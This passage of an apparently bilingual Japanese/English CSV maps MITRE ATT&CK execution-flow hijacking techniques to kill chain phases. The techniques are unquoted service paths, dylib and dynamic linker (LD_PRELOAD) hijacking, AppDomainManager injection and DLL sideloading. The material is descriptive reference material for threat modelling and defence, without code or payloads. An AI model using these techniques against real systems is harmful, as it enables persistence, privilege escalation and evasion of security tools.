Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.009,引用符なしパスによるパスインターセプション,Path Interception by Unquoted Path,"攻撃者は、脆弱なファイルパス参照をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、パス内の上位ディレクトリに実行可能ファイルを配置することにより、周囲に引用符がないパスを利用して、Windowsが攻撃者の実行可能ファイルを選択して起動するように仕向けることができます。

サービスパス（引用: Microsoft CurrentControlSet Services）およびショートカットパスも、パスに1つ以上のスペースがあり、引用符で囲まれていない場合（例：<code>C:\\unsafe path with space\\program.exe</code> 対 <code>\""C:\\safe path with space\\program.exe\""</code>）、パスインターセプションに対して脆弱である可能性があります。(引用: Help eliminate unquoted path)（Windowsレジストリキーに格納）攻撃者はパスの上位ディレクトリに実行可能ファイルを配置でき、Windowsは意図した実行可能ファイルの代わりにその実行可能ファイルを解決します。例えば、ショートカットのパスが<code>C:\\program files\\myapp.exe</code>である場合、攻撃者は<code>C:\\program.exe</code>にプログラムを作成し、意図したプログラムの代わりに実行させることができます。(引用: Windows Unquoted Services) (引用: Windows Privilege Escalation Guide)

このテクニックは、実行可能ファイルが定期的に呼び出される場合に永続性のために使用でき、また、傍受された実行可能ファイルがより高い権限を持つプロセスによって開始される場合には権限昇格のために使用できます。","Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\""C:\\safe path with space\\program.exe\""</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.004,Dylibハイジャック,Dylib Hijacking,"攻撃者は、被害者のアプリケーションが実行時に検索するパスに、予想される名前の悪意のあるダイナミック・ライブラリ（dylib）を配置することで、独自のペイロードを実行する可能性があります。ダイナミック・ローダーは、検索パスの順序に基づいて、dylib を見つけようとします。ディリブへのパスの先頭には <code>@rpath</code> を付けることができ、開発者は相対パスを使用して実行可能ファイルの場所に基づいて実行時に使用される検索パスの配列を指定することができます。 さらに、<code>LC_LOAD_WEAK_DYLIB</code> 関数のような弱いリンクが使用されている場合、期待される dylib が存在しなくてもアプリケーションは実行されます。弱いリンクによって、開発者は新しいAPIが追加されたときに、複数のmacOSバージョンでアプリケーションを実行することができます。

攻撃者は、特定されたパスに欠落している dylib の名前を持つ悪意のある dylib を挿入することで、実行を獲得する可能性があります（引用：Wardle Dylib Hijack Vulnerable Apps）（引用：Wardle Dylib Hijacking OSX 2015）（引用：Github EmpireProject HijackScanner）（引用：Github EmpireProject CreateHijacker Dylib） dylib はアプリケーションのアドレス空間にロードされ、悪意のある dylib がアプリケーションの特権レベルとリソースを継承できるようになります。アプリケーションによっては、特権の昇格や無制限のネットワークアクセスを引き起こす可能性があります。この方法は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品からの検出を回避することもできます。(引用：Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)","Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.006,ダイナミックリンカーハイジャック,Dynamic Linker Hijacking,"攻撃者は、ダイナミックリンカーが共有ライブラリをロードするために使用する環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。プログラムの実行準備段階で、ダイナミックリンカーは、Linux の <code>LD_PRELOAD</code> や macOS の <code>DYLD_INSERT_LIBRARIES</code> など、さまざまな環境変数やファイルから共有ライブラリの指定された絶対パスをロードします。(引用: TheEvilBit DYLD_INSERT_LIBRARIES)(引用: Timac DYLD_INSERT_LIBRARIES)(引用: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) 環境変数で指定されたライブラリは、同じ関数名のシステムライブラリよりも優先して最初にロードされます。(引用: Man LD.SO)(引用: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) 各プラットフォームのリンカーは、実行のさまざまな時点で環境変数の広範なリストを使用します。これらの変数は、開発者が再コンパイルすることなくバイナリをデバッグしたり、マップされたシンボルの競合を解除したり、元のライブラリにカスタム関数を実装したりするために、しばしば使用される(引用: Baeldung LD_PRELOAD)

ダイナミック・リンカー変数をハイジャックすると、被害者プロセスのメモリ、システム/ネットワーク・リソースへのアクセスが許可され、特権が昇格する可能性があります。Linux では、敵対者は <code>LD_PRELOAD</code> を設定して、被害者プログラムによって要求された正当なライブラリの名前と一致する悪意のあるライブラリを指すようにし、被害者プログラムの実行時にオペレーティングシステムに敵対者の悪意のあるコードをロードさせる可能性があります。例えば、敵は <code>LD_PRELOAD</code> を使って <code>sshd</code> デーモンのすべての子孫プロセスに悪意のあるライブラリを注入し、結果として正規のプロセスで実行させる。実行中のサブプロセスが <code>execve</code> 関数を呼び出すと、ディスク上のシステムライブラリに含まれるシステム関数 <code>execve</code> ではなく、悪意のあるライブラリの <code>execve</code> 関数が実行される。<code>execve</code>や<code>readdir</code>などのシステム関数をフックすることで、マルウェアが<code>ls</code>、<code>ldd</code>、<code>iptables</code>、<code>dmesg</code>などのコマンドの結果から自身のアーティファクトをスクラブすることが可能になるため、敵対者は検出から[アーティファクトを隠す](https://attack.mitre.org/techniques/T1564)ことができる(引用：ESET Ebury Oct 2017)(引用：Intezer Symbiote 2022)(引用：Elastic Security Labs Pumakit 2024)

動的リンカー変数をハイジャックすることで、被害者プロセスのメモリ、システム/ネットワークリソースへのアクセスが許可され、特権が昇格する可能性があります。","Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)

Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.014,AppDomainManager,AppDomainManager,"攻撃者は、.NET の `AppDomainManager` がアセンブリをロードする方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。.NETフレームワークは、`AppDomainManager`クラスを使用して、.NETアプリケーションの実行をホストするプロセス内に1つ以上の隔離された実行環境（アプリケーションドメインと呼ばれる）を作成し、管理します。アセンブリ（.NETコードとして実行するためにコンパイルされた`.exe`または`.dll`バイナリ）は、実行可能コードとしてアプリケーションドメインにロードすることができる（引用：Microsoft App Domains）。

「AppDomainManagerインジェクション」として知られるこの攻撃は、.NETアプリケーションがアセンブリをロードする方法をハイジャックすることで、任意のコードを実行する可能性があります。例えば、マルウェアはターゲットプロセス内にカスタムアプリケーションドメインを作成し、任意のアセンブリをロードして実行します。あるいは、.NET ランタイム設定を定義する設定ファイル (`.config`) やプロセス環境変数が改ざんされ、悪意のあるアセンブリ (名前で識別される) をターゲットプロセスにロードするよう、良性の .NET アプリケーションに指示することもあります。(引用: PenTestLabs AppDomainManagerInject)(引用: PwC Yellow Liderc)(引用: Rapid7 AppDomain Manager Injection)","Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains)

Known as \""AppDomainManager injection,\"" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1574,実行フローのハイジャック,Hijack Execution Flow,"攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。

攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。","Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",T1574.001,DLL,DLL,"攻撃者は、永続性を実現し、特権を昇格させ、防御を回避するために、ダイナミック・リンク・ライブラリ・ファイル（DLL）を悪用する可能性がある。DLLは、複数のプログラムで同時に利用できるコードとデータを含むライブラリである。DLLは本来悪意のあるものではないが、サイドローディング、検索順序の乗っ取り、ファントムDLLハイジャックなどのメカニズムによって悪用される可能性がある(引用：unit 42)。

DLLが敵対者によって悪用される具体的な方法には、次のようなものがある：

### DLL サイドローディング\nDLLのサイドローディング 敵は、DLLをサイドローディングすることで、独自の悪意のあるペイロードを実行する可能性があります。サイドローディングは、プログラムがロードする DLL を植え付け、ペイロードを実行する正規のアプリケーションを起動することで、DLL を乗っ取ることを意味します。

サイドローディングは、被害者アプリケーションと悪意のあるペイロードの両方を、互いに隣り合わせに配置します。攻撃者はサイドローディングを、正規の、信頼された、潜在的に昇格されたシステムまたはソフトウェアプロセスの下で実行するアクションを隠す手段として使用している可能性が高いです。ペイロードのサイドローディングに使用される良性の実行ファイルは、配信中や実行中にフラグが立てられない可能性があります。敵対的なペイロードは、信頼されたプロセスのメモリにロードされるまで、暗号化/パックされるか、または他の方法で難読化される可能性もあります。

攻撃者は、BPL (Borland Package Library) などの他のパッケージをサイドロードすることもあります(引用: kroll bpl)。

### DLL 検索順序のハイジャック\n攻撃者は、Windows が DLL をロードする際に使用する検索順序をハイジャックすることで、独自の悪質なペイロードを実行する可能性があります。この検索順序は、DLL をロードする際にプログラムがチェックする、特別な検索場所と標準的な検索場所のシーケンスです。敵対者は、DLLの検索順序によって正当なライブラリの場所よりも優先されるディレクトリに、トロイの木馬のDLLを仕込むことができる。これにより、被害者プログラムによって悪意のあるDLLが呼び出されると、Windowsはそれをロードするようになる(引用：unit 42)。

### DLL リダイレクト\nDLLリダイレクトは、有効化された後（レジストリまたはリダイレクトファイルの作成により）、プログラムに別の場所からDLLをロードさせる可能性があります。 引用：Microsoft リダイレクト）（引用：Microsoft - manifests/assembly

### ファントム DLL ハイジャック\n攻撃者は、存在しない DLL ファイルへの参照を標的とすることで、ファントム DLL ハイジャックを利用する可能性があります。彼らは、存在しないモジュールの場所に正しい名前で悪意のある DLL を仕込むことで、独自の悪意のある DLL をロードできる可能性があります(引用: Hexacorn DLL ハイジャック)(引用: Hijack DLLs CrowdStrike)

### DLL の置換\n攻撃者は、既存の有効な DLL ファイルを標的にし、有効な DLL ファイルと同じ名前と同じ場所に、自分自身の悪意のある DLL を植え付けることで、DLL を置き換える可能性があります(引用: Wietze Beukema DLL ハイジャック)。

DLLハイジャックの被害に遭ったプログラムは、悪意のあるDLLが正規のDLLも読み込むように設定されているため、防御を回避して正常に動作しているように見えることがある。

リモートDLLハイジャックは、DLLをロードする前にプログラムがカレントディレクトリをWeb共有などのリモートの場所に設定することで発生する可能性がある(引用：DLL pre load owasp)(引用：Microsoft remote preloading)

有効なDLLがより高い特権レベルで実行されるように設定されている場合、ロードされる敵に制御されたDLLもより高いレベルで実行される。この場合、このテクニックは特権の昇格に使われる可能性がある。","Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

Specific ways DLLs are abused by adversaries include:

### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

